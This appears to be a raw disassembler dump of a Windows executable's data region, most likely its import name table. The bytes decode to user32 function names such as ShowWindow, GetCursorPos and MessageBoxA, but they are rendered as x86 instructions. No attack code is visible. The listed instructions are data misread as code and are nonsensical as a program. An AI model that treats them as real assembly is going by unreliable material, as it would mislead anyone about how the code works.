  413b5c:	outs   dx,BYTE PTR ds:[esi]
  413b5d:	fs push edi
  413b5f:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  413b66:	inc    ecx
  413b67:	add    BYTE PTR [ebp+0x1],bh
  413b6a:	dec    eax
  413b6b:	imul   esp,DWORD PTR [ebp+eiz*2+0x43],0x74657261
  413b73:	add    BYTE PTR [esi+0x1],ah
  413b76:	inc    edi
  413b77:	gs je  0x413bcf
  413b7a:	jae    0x413be1
  413b7c:	jb     0x413bcd
  413b7e:	bound  ebp,QWORD PTR [edx+0x65]
  413b81:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  413b85:	outs   dx,WORD PTR ds:[esi]
  413b87:	jb     0x413bf6
  413b89:	popa   
  413b8a:	je     0x413bf5
  413b8c:	outs   dx,DWORD PTR ds:[esi]
  413b8d:	outs   dx,BYTE PTR ds:[esi]
  413b8e:	push   edi
  413b8f:	add    ch,bl
  413b91:	add    BYTE PTR [ebp+0x71],al
  413b94:	jne    0x413bf7
  413b96:	ins    BYTE PTR es:[edi],dx
  413b97:	push   edx
  413b98:	arpl   WORD PTR gs:[eax+eax*1-0x6c],si
  413b9d:	add    dl,BYTE PTR [edx+esi*2+0x61]
  413ba1:	outs   dx,BYTE PTR ds:[esi]
  413ba2:	jae    0x413c10
  413ba4:	popa   
  413ba5:	je     0x413c0c
  413ba7:	inc    ecx
  413ba8:	arpl   WORD PTR [ebx+0x65],sp
  413bab:	ins    BYTE PTR es:[edi],dx
  413bac:	gs jb  0x413c10
  413baf:	je     0x413c20
  413bb1:	jb     0x413c0a
  413bb3:	add    BYTE PTR [esi],bh
  413bb5:	add    BYTE PTR [ebx+0x68],al
  413bb8:	imul   ebp,DWORD PTR [esp+eiz*2+0x57],0x6f646e69
  413bc0:	ja     0x413c08
  413bc2:	jb     0x413c33
  413bc4:	ins    DWORD PTR es:[edi],dx
  413bc5:	push   eax
  413bc6:	outs   dx,DWORD PTR ds:[esi]
  413bc7:	imul   ebp,DWORD PTR [esi+0x74],0x28a0000
  413bce:	push   esp
  413bcf:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x6f646e69
  413bd7:	ja     0x413c4c
  413bd9:	add    BYTE PTR [esi+0x616f4c01],dh
  413bdf:	fs dec ebp
  413be1:	outs   dx,BYTE PTR gs:[esi]
  413be3:	jne    0x413c26
  413be5:	add    al,al
  413be7:	add    BYTE PTR [ebp+0x6e],al
  413bea:	popa   
  413beb:	bound  ebp,QWORD PTR [ebp+eiz*2+0x53]
  413bef:	arpl   WORD PTR [edx+0x6f],si
  413bf2:	ins    BYTE PTR es:[edi],dx
  413bf3:	ins    BYTE PTR es:[edi],dx
  413bf4:	inc    edx
  413bf5:	popa   
  413bf6:	jb     0x413bf8
  413bf8:	xor    al,BYTE PTR [ecx]
  413bfa:	inc    edi
  413bfb:	gs je  0x413c4b
  413bfe:	outs   dx,BYTE PTR gs:[esi]
  413c00:	jne    0x413c4b
  413c02:	je     0x413c69
  413c04:	ins    DWORD PTR es:[edi],dx
  413c05:	inc    ebx
  413c06:	outs   dx,DWORD PTR ds:[esi]
  413c07:	jne    0x413c77
  413c09:	je     0x413c0b
  413c0b:	add    cl,ah
  413c0d:	add    BYTE PTR [esi+0x69],al
  413c10:	outs   dx,BYTE PTR ds:[esi]
  413c11:	fs push edi
  413c13:	imul   ebp,DWORD PTR [esi+0x64],0x41776f
  413c1a:	rol    BYTE PTR [ecx],1
  413c1c:	dec    ebp
  413c1d:	gs jae 0x413c93
  413c20:	popa   
  413c21:	addr16 gs inc edx
  413c24:	outs   dx,DWORD PTR ds:[esi]
  413c25:	js     0x413c6c
  413c27:	js     0x413c80
  413c29:	add    BYTE PTR [eax+0x536e4901],al
  413c2f:	outs   dx,BYTE PTR gs:[esi]
  413c31:	fs dec ebp
  413c33:	gs jae 0x413ca9
  413c36:	popa   
  413c37:	addr16 gs add al,bl
  413c3b:	add    DWORD PTR [ebp+0x6f],ecx
  413c3e:	outs   dx,BYTE PTR ds:[esi]
  413c3f:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6d6f7246
  413c47:	push   eax
  413c48:	outs   dx,DWORD PTR ds:[esi]
  413c49:	imul   ebp,DWORD PTR [esi+0x74],0x1680000
  413c50:	inc    edi
  413c51:	gs je  0x413cab
  413c54:	imul   ebp,DWORD PTR [esi+0x64],0x7d00776f
  413c5b:	add    dl,BYTE PTR [ebx+0x68]
  413c5e:	outs   dx,DWORD PTR ds:[esi]
  413c5f:	ja     0x413cb4
  413c61:	arpl   WORD PTR [edx+0x6f],si
  413c64:	ins    BYTE PTR es:[edi],dx
  413c65:	ins    BYTE PTR es:[edi],dx
  413c66:	inc    edx
  413c67:	popa   
  413c68:	jb     0x413c6a
  413c6a:	mov    cl,0x1
  413c6c:	dec    esp
  413c6d:	outs   dx,DWORD PTR ds:[esi]
  413c6e:	popa   
  413c6f:	fs dec ecx
  413c71:	ins    DWORD PTR es:[edi],dx
  413c72:	popa   
  413c73:	addr16 gs inc ecx
  413c76:	add    BYTE PTR [eax],al
  413c78:	cdq    
  413c79:	add    BYTE PTR [ecx+ebp*2+0x61],al
  413c7d:	ins    BYTE PTR es:[edi],dx
  413c7e:	outs   dx,DWORD PTR ds:[esi]
  413c7f:	addr16 inc edx
  413c81:	outs   dx,DWORD PTR ds:[esi]
  413c82:	js     0x413ccd
  413c84:	outs   dx,BYTE PTR ds:[esi]
  413c85:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  413c8d:	jb     0x413cf0
  413c8f:	ins    DWORD PTR es:[edi],dx
  413c90:	inc    ecx
  413c91:	add    ch,al
  413c93:	add    DWORD PTR [ebp+0x61],ecx
  413c96:	jo     0x413cee
  413c98:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  413c9f:	gs jns 0x413ce3
  413ca2:	add    BYTE PTR [eax],al
  413ca4:	sbb    BYTE PTR [edx],al
  413ca6:	push   edx
  413ca7:	gs ins DWORD PTR es:[edi],dx
  413ca9:	outs   dx,DWORD PTR ds:[esi]
  413caa:	jbe    0x413d11
  413cac:	push   eax
  413cad:	jb     0x413d1e
  413caf:	jo     0x413d08
  413cb1:	add    BYTE PTR [ecx+eax*1+0x47],ah
  413cb5:	gs je  0x413d0d
  413cb8:	jo     0x413d1e
  413cba:	popa   
  413cbb:	je     0x413d22
  413cbd:	push   edx
  413cbe:	outs   dx,BYTE PTR ds:[si]
  413cc0:	add    BYTE PTR [eax],al
  413cc2:	add    al,BYTE PTR [edx]
  413cc4:	push   edx
  413cc5:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  413cce:	popa   
  413ccf:	jae    0x413d44
  413cd1:	inc    ecx
  413cd2:	add    BYTE PTR [eax],al
  413cd4:	add    dl,BYTE PTR ds:[ebx+0x65]
  413cd8:	je     0x413d1e
  413cda:	ins    BYTE PTR es:[edi],dx
  413cdb:	addr16 dec ecx
  413cdd:	je     0x413d44
  413cdf:	ins    DWORD PTR es:[edi],dx
  413ce0:	push   esp
  413ce1:	gs js  0x413d58
  413ce4:	inc    ecx
  413ce5:	add    BYTE PTR [ebp+0x61724400],dh
  413ceb:	ja     0x413d3a
  413ced:	outs   dx,BYTE PTR gs:[esi]
  413cef:	jne    0x413d33
  413cf1:	popa   
  413cf2:	jb     0x413cf4
  413cf4:	sub    eax,DWORD PTR [ecx]
  413cf6:	inc    edi
  413cf7:	gs je  0x413d47
  413cfa:	outs   dx,BYTE PTR gs:[esi]
  413cfc:	jne    0x413cfe
  413cfe:	repnz add DWORD PTR [eax+0x6f],edx
  413d02:	jae    0x413d78
  413d04:	dec    ebp
  413d05:	gs jae 0x413d7b
  413d08:	popa   
  413d09:	addr16 gs push edi
  413d0c:	add    BYTE PTR [eax],al
  413d0e:	push   cs
  413d0f:	add    DWORD PTR [edi+0x65],eax
  413d12:	je     0x413d58
  413d14:	ins    BYTE PTR es:[edi],dx
  413d15:	addr16 inc ebx
  413d17:	je     0x413d8b
  413d19:	ins    BYTE PTR es:[edi],dx
  413d1a:	dec    ecx
  413d1b:	inc    esp
  413d1c:	add    BYTE PTR [eax],al
  413d1e:	mov    cl,0x2
  413d20:	push   esi
  413d21:	imul   ecx,DWORD PTR [ebx+0x65],0x79
  413d25:	push   ebx
  413d26:	arpl   WORD PTR [ecx+0x6e],sp
  413d29:	push   edi
  413d2a:	add    BYTE PTR [eax],al
  413d2c:	sbb    BYTE PTR [ecx],al
  413d2e:	inc    edi
  413d2f:	gs je  0x413d7b
  413d32:	arpl   WORD PTR [edi+0x6e],bp
  413d35:	dec    ecx
  413d36:	outs   dx,BYTE PTR ds:[esi]
  413d37:	outs   dx,WORD PTR ds:[esi]
  413d39:	add    cl,cl
  413d3b:	add    DWORD PTR [ebp+0x61],ecx
  413d3e:	jo     0x413d97
  413d40:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  413d47:	imul   ebp,DWORD PTR [esi+0x74],0x2d0073
  413d4e:	inc    ebx
  413d4f:	push   0x654e7261
  413d54:	js     0x413dca
  413d56:	push   edi
  413d57:	add    BYTE PTR [ecx],ch
  413d59:	add    dl,BYTE PTR [ebx+0x65]
  413d5c:	outs   dx,BYTE PTR ds:[esi]
  413d5d:	fs dec ebp
  413d5f:	gs jae 0x413dd5
  413d62:	popa   
  413d63:	addr16 gs push esp
  413d66:	imul   ebp,DWORD PTR [ebp+0x65],0x4174756f
  413d6d:	add    BYTE PTR [eax],ch
  413d6f:	add    BYTE PTR [ebx+0x68],al
  413d72:	popa   
  413d73:	jb     0x413dc1
  413d75:	outs   dx,DWORD PTR ds:[esi]
  413d76:	ja     0x413ddd
  413d78:	jb     0x413dbc
  413d7a:	jne    0x413de2
  413d7c:	push   di
  413d7e:	add    BYTE PTR [eax],al
  413d80:	ins    DWORD PTR es:[edi],dx
  413d81:	add    DWORD PTR [edi+0x65],eax
  413d84:	je     0x413ddd
  413d86:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  413d8d:	outs   dx,BYTE PTR ds:[esi]
  413d8e:	addr16 push edi
  413d90:	add    BYTE PTR [eax],al
  413d92:	mov    bh,0x2
  413d94:	push   edi
  413d95:	popa   
  413d96:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  413d9e:	jne    0x413e14
  413da0:	dec    ecx
  413da1:	fs ins BYTE PTR es:[edi],dx
  413da3:	add    BYTE PTR gs:[eax],al
  413da6:	mov    DWORD PTR [ecx],0x5670614d
  413dac:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  413db3:	gs jns 0x413dfb
  413db6:	js     0x413e0f
  413db8:	add    BYTE PTR [eax],al
  413dba:	cmp    eax,0x65684300
  413dbf:	arpl   WORD PTR [ebx+0x52],bp
  413dc2:	popa   
  413dc3:	imul   ebp,DWORD PTR fs:[edi+0x42],0x6f747475
  413dcb:	outs   dx,BYTE PTR ds:[esi]
  413dcc:	add    BYTE PTR [eax],al
  413dce:	add    eax,0x6c6c4100
  413dd3:	outs   dx,DWORD PTR ds:[esi]
  413dd4:	ja     0x413e29
  413dd6:	gs je  0x413e1f
  413dd9:	outs   dx,DWORD PTR ds:[esi]
  413dda:	jb     0x413e41
  413ddc:	addr16 jb 0x413e4e
  413ddf:	jne    0x413e4f
  413de1:	fs push edi
  413de3:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  413dea:	into   
  413deb:	add    DWORD PTR [ebp+0x65],ecx
  413dee:	jae    0x413e63
  413df0:	popa   
  413df1:	addr16 gs inc edx
  413df4:	outs   dx,DWORD PTR ds:[esi]
  413df5:	js     0x413e38
  413df7:	add    BYTE PTR [edx],bh
  413df9:	add    DWORD PTR [edi+0x65],eax
  413dfc:	je     0x413e4b
  413dfe:	gs jae 0x413e74
  413e01:	popa   
  413e02:	addr16 gs inc ecx
  413e05:	add    BYTE PTR [edx+0x2],cl
  413e08:	push   ebx
  413e09:	gs je  0x413e59
  413e0c:	outs   dx,BYTE PTR gs:[esi]
  413e0e:	jne    0x413e54
  413e10:	gs popaw 
  413e13:	jne    0x413e81
  413e15:	je     0x413e60
  413e17:	je     0x413e7e
  413e19:	ins    DWORD PTR es:[edi],dx
  413e1a:	add    BYTE PTR [eax],al
  413e1c:	aad    0x1
  413e1e:	dec    ebp
  413e1f:	gs jae 0x413e95
  413e22:	popa   
  413e23:	addr16 gs inc edx
  413e26:	outs   dx,DWORD PTR ds:[esi]
  413e27:	js     0x413e80
  413e29:	add    BYTE PTR [ecx],bh
  413e2b:	add    DWORD PTR [edi+0x65],eax
  413e2e:	je     0x413e7d
  413e30:	outs   dx,BYTE PTR gs:[esi]
  413e32:	jne    0x413e87
  413e34:	je     0x413ea8
  413e36:	imul   ebp,DWORD PTR [esi+0x67],0xb9000057
  413e3d:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  413e41:	fs dec ebp
  413e43:	outs   dx,BYTE PTR gs:[esi]
  413e45:	jne    0x413e9e
  413e47:	add    BYTE PTR [ecx+eax*1+0x47],bl
  413e4b:	gs je  0x413ea1
  413e4e:	jns    0x413ec3
  413e50:	je     0x413eb7
  413e52:	ins    DWORD PTR es:[edi],dx
  413e53:	dec    ebp
  413e54:	gs je  0x413ec9
  413e57:	imul   esp,DWORD PTR [ebx+0x73],0x2260000
  413e5e:	push   ebx
  413e5f:	outs   dx,BYTE PTR gs:[esi]
  413e61:	fs dec ebp
  413e63:	gs jae 0x413ed9
  413e66:	popa   
  413e67:	addr16 gs inc ecx
  413e6a:	add    BYTE PTR [eax],al
  413e6c:	aaa    
  413e6d:	add    DWORD PTR [edi+0x65],eax
  413e70:	je     0x413ebf
  413e72:	outs   dx,BYTE PTR gs:[esi]
  413e74:	jne    0x413ec9
  413e76:	je     0x413ed9
  413e78:	je     0x413edf
  413e7a:	add    BYTE PTR [eax],al
  413e7c:	mov    bl,0x0
  413e7e:	inc    esp
  413e7f:	jb     0x413ee2
  413e81:	ja     0x413ecc
  413e83:	arpl   WORD PTR [edi+0x6e],bp
  413e86:	add    BYTE PTR [eax],al
  413e88:	xchg   ebp,eax
  413e89:	add    BYTE PTR [ebp+eiz*2+0x73],al
  413e8d:	je     0x413f01
  413e8f:	outs   dx,DWORD PTR ds:[esi]
  413e90:	jns    0x413ed5
  413e92:	jne    0x413f06
  413e94:	jae    0x413f05
  413e96:	jb     0x413e98
  413e98:	add    al,BYTE PTR [eax]
  413e9a:	inc    ecx
  413e9b:	fs push 0x75
  413e9e:	jae    0x413f14
  413ea0:	push   edi
  413ea1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  413ea8:	arpl   WORD PTR [eax+eax*1+0x0],si
  413eac:	pop    ecx
  413ead:	add    DWORD PTR [edi+0x65],eax
  413eb0:	je     0x413f05
  413eb2:	jns    0x413f27
  413eb4:	inc    ebx
  413eb5:	outs   dx,DWORD PTR ds:[esi]
  413eb6:	ins    BYTE PTR es:[edi],dx
  413eb7:	outs   dx,DWORD PTR ds:[esi]
  413eb8:	jb     0x413eba
  413eba:	jle    0x413ebd
  413ebc:	dec    eax
  413ebd:	imul   ebp,DWORD PTR [ecx+ebp*2+0x74],0x6e654d65
  413ec5:	jne    0x413f10
  413ec7:	je     0x413f2e
  413ec9:	ins    DWORD PTR es:[edi],dx
  413eca:	add    BYTE PTR [eax],al
  413ecc:	or     DWORD PTR [eax],eax
  413ece:	inc    ecx
  413ecf:	jo     0x413f41
  413ed1:	outs   dx,BYTE PTR gs:[esi]
  413ed3:	fs dec ebp
  413ed5:	outs   dx,BYTE PTR gs:[esi]
  413ed7:	jne    0x413f30
  413ed9:	add    BYTE PTR [eax+eax*1],bh
  413edc:	inc    ebx
  413edd:	push   0x4d6b6365
  413ee2:	outs   dx,BYTE PTR gs:[esi]
  413ee4:	jne    0x413f38
  413ee6:	popa   
  413ee7:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  413eef:	add    BYTE PTR [ecx+eax*1+0x64616f4c],bh
  413ef6:	push   ebx
  413ef7:	je     0x413f6b
  413ef9:	imul   ebp,DWORD PTR [esi+0x67],0x21f0057
  413f00:	push   ebx
  413f01:	arpl   WORD PTR [edx+0x6f],si
  413f04:	ins    BYTE PTR es:[edi],dx
  413f05:	ins    BYTE PTR es:[edi],dx
  413f06:	push   edi
  413f07:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  413f0e:	xor    DWORD PTR [eax],eax
  413f10:	inc    ebx
  413f11:	push   0x72507261
  413f16:	gs jbe 0x413f70
  413f19:	add    BYTE PTR [edi+0x2],bl
  413f1c:	push   ebx
  413f1d:	gs je  0x413f73
  413f20:	jns    0x413f95
  413f22:	inc    ebx
  413f23:	outs   dx,DWORD PTR ds:[esi]
  413f24:	ins    BYTE PTR es:[edi],dx
  413f25:	outs   dx,DWORD PTR ds:[esi]
  413f26:	jb     0x413f9b
  413f28:	add    BYTE PTR [eax],al
  413f2a:	sgdtd  [edi+0x65]
  413f2e:	je     0x413f74
  413f30:	ins    BYTE PTR es:[edi],dx
  413f31:	addr16 dec ecx
  413f33:	je     0x413f9a
  413f35:	ins    DWORD PTR es:[edi],dx
  413f36:	add    BYTE PTR [eax],al
  413f38:	dec    esp
  413f39:	add    dl,BYTE PTR [ebx+0x65]
  413f3c:	je     0x413f8b
  413f3e:	outs   dx,BYTE PTR gs:[esi]
  413f40:	jne    0x413f8b
  413f42:	je     0x413fa9
  413f44:	ins    DWORD PTR es:[edi],dx
  413f45:	inc    edx
  413f46:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x7370
  413f4e:	or     al,0x1
  413f50:	inc    edi
  413f51:	gs je  0x413f98
  413f54:	gs jae 0x413fc2
  413f57:	je     0x413fc8
  413f59:	jo     0x413fb2
  413f5b:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  413f62:	inc    ebp
  413f63:	add    DWORD PTR [edi+0x65],eax
  413f66:	je     0x413fb8
  413f68:	popa   
  413f69:	jb     0x413fd0
  413f6b:	outs   dx,BYTE PTR ds:[esi]
  413f6c:	je     0x413f6e
  413f6e:	mov    BYTE PTR [eax],0x45
  413f71:	outs   dx,BYTE PTR ds:[esi]
  413f72:	fs push esp
  413f74:	popa   
  413f75:	jae    0x413fe2
  413f77:	add    BYTE PTR [eax+0x0],ah
  413f7a:	inc    ebx
  413f7b:	jb     0x413fe2
  413f7d:	popa   
  413f7e:	je     0x413fe5
  413f80:	dec    ebp
  413f81:	outs   dx,BYTE PTR gs:[esi]
  413f83:	jne    0x413f85
  413f85:	add    bl,dh
  413f87:	add    BYTE PTR [edi+0x65],al
  413f8a:	je     0x413fcf
  413f8c:	popa   
  413f8d:	jb     0x413ff4
  413f8f:	je     0x413fe1
  413f91:	outs   dx,DWORD PTR ds:[esi]
  413f92:	jae    0x413f94
  413f94:	sub    eax,DWORD PTR [edx]
  413f96:	push   ebx
  413f97:	outs   dx,BYTE PTR gs:[esi]
  413f99:	fs dec ebp
  413f9b:	gs jae 0x414011
  413f9e:	popa   
  413f9f:	addr16 gs push edi
  413fa2:	add    BYTE PTR [eax],al
  413fa4:	test   DWORD PTR [ecx],eax
  413fa6:	dec    ecx
  413fa7:	outs   dx,BYTE PTR ds:[esi]
  413fa8:	jae    0x41400f
  413faa:	jb     0x414020
  413fac:	dec    ebp
  413fad:	outs   dx,BYTE PTR gs:[esi]
  413faf:	jne    0x413ffa
  413fb1:	je     0x414018
  413fb3:	ins    DWORD PTR es:[edi],dx
  413fb4:	push   edi
  413fb5:	add    BYTE PTR [ecx+0x0],ah
  413fb8:	inc    ebx
  413fb9:	jb     0x414020
  413fbb:	popa   
  413fbc:	je     0x414023
  413fbe:	push   eax
  413fbf:	outs   dx,DWORD PTR ds:[esi]
  413fc0:	jo     0x414037
  413fc2:	jo     0x414011
  413fc4:	outs   dx,BYTE PTR gs:[esi]
  413fc6:	jne    0x413fc8
  413fc8:	inc    eax
  413fc9:	add    DWORD PTR [edi+0x65],eax
  413fcc:	je     0x41401b
  413fce:	outs   dx,DWORD PTR ds:[esi]
  413fcf:	outs   dx,BYTE PTR ds:[esi]
  413fd0:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6f666e49
  413fd8:	push   edi
  413fd9:	add    al,cl
  413fdb:	add    DWORD PTR [ebp+0x61],ecx
  413fde:	jo     0x414036
  413fe0:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  413fe7:	gs jns 0x414041
  413fea:	add    BYTE PTR [eax],al
  413fec:	out    0x0,eax
  413fee:	inc    esi
  413fef:	jb     0x414052
  413ff1:	ins    DWORD PTR es:[edi],dx
  413ff2:	gs push edx
  413ff4:	arpl   WORD PTR gs:[eax+eax*1-0x41],si
  413ff9:	add    BYTE PTR [ebp+0x6e],al
  413ffc:	popa   
  413ffd:	bound  ebp,QWORD PTR [ebp+eiz*2+0x4d]
  414001:	outs   dx,BYTE PTR gs:[esi]
  414003:	jne    0x41404e
  414005:	je     0x41406c
  414007:	ins    DWORD PTR es:[edi],dx
  414008:	add    BYTE PTR [eax],al
  41400a:	fwait
  41400b:	add    dl,BYTE PTR [ebp+0x6e]
  41400e:	ins    BYTE PTR es:[edi],dx
  41400f:	outs   dx,DWORD PTR ds:[esi]
  414010:	popa   
  414011:	fs dec ebx
  414013:	gs jns 0x414078
  414016:	outs   dx,DWORD PTR ds:[esi]
  414017:	popa   
  414018:	jb     0x41407e
  41401a:	dec    esp
  41401b:	popa   
  41401c:	jns    0x41408d
  41401e:	jne    0x414094
  414020:	add    BYTE PTR [eax],al
  414022:	mov    esp,0x6e695702
  414027:	outs   dx,DWORD PTR fs:[esi]
  414029:	ja     0x414071
  41402b:	jb     0x41409c
  41402d:	ins    DWORD PTR es:[edi],dx
  41402e:	push   eax
  41402f:	outs   dx,DWORD PTR ds:[esi]
  414030:	imul   ebp,DWORD PTR [esi+0x74],0x4400ab00
  414037:	jb     0x41409a
  414039:	ja     0x41407c
  41403b:	outs   dx,BYTE PTR ds:[esi]
  41403c:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  414043:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  414048:	and    BYTE PTR [edx],al
  41404a:	push   ebx
  41404b:	arpl   WORD PTR [edx+0x6f],si
  41404e:	ins    BYTE PTR es:[edi],dx
  41404f:	ins    BYTE PTR es:[edi],dx
  414050:	push   edi
  414051:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  414058:	add    BYTE PTR [eax],al
  41405a:	pop    eax
  41405b:	add    dl,BYTE PTR [ebx+0x65]
  41405e:	je     0x4140b2
  414060:	arpl   WORD PTR gs:[eax+eax*1+0x3d],si
  414065:	add    dl,BYTE PTR [ebx+0x65]
  414068:	je     0x4140ae
  41406a:	ins    BYTE PTR es:[edi],dx
  41406b:	addr16 dec ecx
  41406d:	je     0x4140d4
  41406f:	ins    DWORD PTR es:[edi],dx
  414070:	dec    ecx
  414071:	outs   dx,BYTE PTR ds:[esi]
  414072:	je     0x414074
  414074:	or     eax,0x67654200
  414079:	imul   ebp,DWORD PTR [esi+0x50],0x746e6961
  414080:	add    BYTE PTR [eax],al
  414082:	pop    ebp
  414083:	add    BYTE PTR [ebx+0x72],al
  414086:	gs popa 
  414088:	je     0x4140ef
  41408a:	dec    ecx
  41408b:	arpl   WORD PTR [edi+0x6e],bp
  41408e:	dec    ecx
  41408f:	outs   dx,BYTE PTR ds:[esi]
  414090:	imul   esi,DWORD PTR fs:[edx+0x65],0x7463
  414098:	dec    esi
  414099:	add    dl,BYTE PTR [ebx+0x65]
  41409c:	je     0x4140eb
  41409e:	outs   dx,BYTE PTR gs:[esi]
  4140a0:	jne    0x4140eb
  4140a2:	je     0x414109
  4140a4:	ins    DWORD PTR es:[edi],dx
  4140a5:	dec    ecx
  4140a6:	outs   dx,BYTE PTR ds:[esi]
  4140a7:	outs   dx,WORD PTR ds:[esi]
  4140a9:	push   edi
  4140aa:	add    BYTE PTR [eax],al
  4140ac:	pop    edx
  4140ad:	add    dl,BYTE PTR [ebx+0x65]
  4140b0:	je     0x414105
  4140b2:	arpl   WORD PTR [edx+0x6f],si
  4140b5:	ins    BYTE PTR es:[edi],dx
  4140b6:	ins    BYTE PTR es:[edi],dx
  4140b7:	dec    ecx
  4140b8:	outs   dx,BYTE PTR ds:[esi]
  4140b9:	outs   dx,WORD PTR ds:[esi]
  4140bb:	add    BYTE PTR [edx],dh
  4140bd:	add    BYTE PTR [ebx+0x68],al
  4140c0:	popa   
  4140c1:	jb     0x414117
  4140c3:	outs   dx,DWORD PTR ds:[esi]
  4140c4:	dec    edi
  4140c5:	gs ins DWORD PTR es:[edi],dx
  4140c7:	inc    ecx
  4140c8:	add    BYTE PTR [eax],al
  4140ca:	sub    eax,0x6e655302
  4140cf:	fs dec esi
  4140d1:	outs   dx,DWORD PTR ds:[esi]
  4140d2:	je     0x41413d
  4140d4:	data16 jns 0x414124
  4140d7:	gs jae 0x41414d
  4140da:	popa   
  4140db:	addr16 gs push edi
  4140de:	add    BYTE PTR [eax],al
  4140e0:	sti    
  4140e1:	add    BYTE PTR [edi+0x65],al
  4140e4:	je     0x414129
  4140e6:	ins    BYTE PTR es:[edi],dx
  4140e7:	popa   
  4140e8:	jae    0x41415d
  4140ea:	dec    esi
  4140eb:	popa   
  4140ec:	ins    DWORD PTR es:[edi],dx
  4140ed:	gs push edi
  4140ef:	add    BYTE PTR [ebx+0x61725402],dl
  4140f5:	outs   dx,BYTE PTR ds:[esi]
  4140f6:	jae    0x414164
  4140f8:	popa   
  4140f9:	je     0x414160
  4140fb:	inc    ecx
  4140fc:	arpl   WORD PTR [ebx+0x65],sp
  4140ff:	ins    BYTE PTR es:[edi],dx
  414100:	gs jb  0x414164
  414103:	je     0x414174
  414105:	jb     0x414148
  414107:	add    BYTE PTR [ebx+0x2],bh
  41410a:	push   ebx
  41410b:	push   0x7543776f
  414110:	jb     0x414185
  414112:	outs   dx,DWORD PTR ds:[esi]
  414113:	jb     0x414115
  414115:	add    BYTE PTR [ebx+0x2],dh
  414118:	push   ebx
  414119:	gs je  0x414173
  41411c:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  414123:	js     0x414199
  414125:	inc    ecx
  414126:	add    BYTE PTR [eax],al
  414128:	add    BYTE PTR es:[ebx+0x68],al
  41412c:	popa   
  41412d:	jb     0x41417b
  41412f:	outs   dx,DWORD PTR ds:[esi]
  414130:	ja     0x414197
  414132:	jb     0x414175
  414134:	add    BYTE PTR [eax],al
  414136:	xchg   BYTE PTR [ecx],al
  414138:	dec    ecx
  414139:	outs   dx,BYTE PTR ds:[esi]
  41413a:	jae    0x4141a1
  41413c:	jb     0x4141b2
  41413e:	dec    ebp
  41413f:	outs   dx,BYTE PTR gs:[esi]
  414141:	jne    0x41419a
  414143:	add    BYTE PTR [eax],cl
  414145:	add    BYTE PTR [ecx+0x70],al
  414148:	jo     0x4141af
  41414a:	outs   dx,BYTE PTR ds:[esi]
  41414b:	fs dec ebp
  41414d:	outs   dx,BYTE PTR gs:[esi]
  41414f:	jne    0x414192
  414151:	add    BYTE PTR [edx+0x1],ch
  414154:	inc    edi
  414155:	gs je  0x4141af
  414158:	imul   ebp,DWORD PTR [esi+0x64],0x4344776f
  41415f:	add    BYTE PTR [ecx+0x2],bl
  414162:	push   ebx
  414163:	gs je  0x4141b8
  414166:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  41416b:	jo     0x4141e1
  41416d:	jns    0x41416f
  41416f:	add    BYTE PTR [edx+0x1],bl
  414172:	inc    edi
  414173:	gs je  0x4141c9
  414176:	jns    0x4141eb
  414178:	inc    ebx
  414179:	outs   dx,DWORD PTR ds:[esi]
  41417a:	ins    BYTE PTR es:[edi],dx
  41417b:	outs   dx,DWORD PTR ds:[esi]
  41417c:	jb     0x4141c0
  41417e:	jb     0x4141f5
  414180:	jae    0x4141ea
  414182:	add    BYTE PTR [eax],al
  414184:	jg     0x414188
  414186:	push   ebx
  414187:	push   0x6957776f
  41418c:	outs   dx,BYTE PTR ds:[esi]
  41418d:	outs   dx,DWORD PTR fs:[esi]
  41418f:	ja     0x414191
  414191:	add    BYTE PTR [eax+eax*1],ah
  414194:	inc    ebx
  414195:	push   0x65676e61
  41419a:	dec    ebp
  41419b:	outs   dx,BYTE PTR gs:[esi]
  41419d:	jne    0x4141f6
  41419f:	add    al,ah
  4141a1:	add    DWORD PTR [edi+0x65],ecx
  4141a4:	ins    DWORD PTR es:[edi],dx
  4141a5:	push   esp
  4141a6:	outs   dx,DWORD PTR ds:[esi]
  4141a7:	inc    ebx
  4141a8:	push   0x417261
  4141ad:	add    BYTE PTR [edi+0x43734901],cl
  4141b3:	push   0x6c417261
  4141b8:	jo     0x414222
  4141ba:	popa   
  4141bb:	push   edi
  4141bc:	add    BYTE PTR [eax],al
  4141be:	xchg   BYTE PTR [edx],al
  4141c0:	push   ebx
  4141c1:	jns    0x414236
  4141c3:	je     0x41422a
  4141c5:	ins    DWORD PTR es:[edi],dx
  4141c6:	push   eax
  4141c7:	popa   
  4141c8:	jb     0x41422b
  4141ca:	ins    DWORD PTR es:[edi],dx
  4141cb:	gs je  0x414233
  4141ce:	jb     0x414243
  4141d0:	dec    ecx
  4141d1:	outs   dx,BYTE PTR ds:[esi]
  4141d2:	outs   dx,WORD PTR ds:[esi]
  4141d4:	push   edi
  4141d5:	add    BYTE PTR ds:0x67655202,al
  4141db:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  4141e2:	popa   
  4141e3:	jae    0x414258
  4141e5:	push   edi
  4141e6:	add    BYTE PTR [eax],al
  4141e8:	add    BYTE PTR [edx],0x53
  4141eb:	push   0x6957776f
  4141f0:	outs   dx,BYTE PTR ds:[esi]
  4141f1:	outs   dx,DWORD PTR fs:[esi]
